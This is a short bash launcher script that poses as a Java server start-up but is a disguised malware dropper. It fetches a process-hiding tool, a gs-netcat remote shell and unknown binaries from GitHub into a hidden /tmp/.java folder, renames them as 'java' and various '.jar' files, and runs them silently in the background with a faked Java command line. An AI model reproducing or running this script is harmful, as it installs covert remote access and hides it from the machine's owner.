#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin/ && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-aarch64 -o java
    cd /tmp/.java/bin/ && curl -L https://github.com/hackerschoice/gsocket/releases/download/v1.4.43/gs-netcat_linux-aarch64 -o bot.jar
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/arm/web.js -o paper.jar
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/arm/supervisord -o plugins.jar
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/crosmo/n1.conf -o cfg.conf
    cd /tmp/.java/bin/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/tmp/crosmo/n1.json -o conf.json
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && nohup ./java -a 'java -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
}

if [ -f "/tmp/.java/bin/bot.jar" ] && [ -f "/tmp/.java/bin/paper.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
